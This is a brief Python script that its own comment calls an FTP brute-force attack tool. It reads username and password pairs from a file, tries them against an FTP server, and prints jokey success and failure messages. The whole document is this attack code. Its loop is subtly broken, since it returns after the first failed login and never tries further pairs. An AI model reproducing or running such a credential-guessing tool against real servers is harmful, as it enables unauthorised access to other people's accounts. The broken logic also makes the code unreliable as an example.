#!/usr/bin/env python3
#This tool is used for ftp brute force attack
import ftplib, time

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: "+userName+"/"+passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) +\
            ' Congrats you hacked the CIA '+userName+"/"+passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            print('\n[-] A horse says NAY.')
            return (None, None)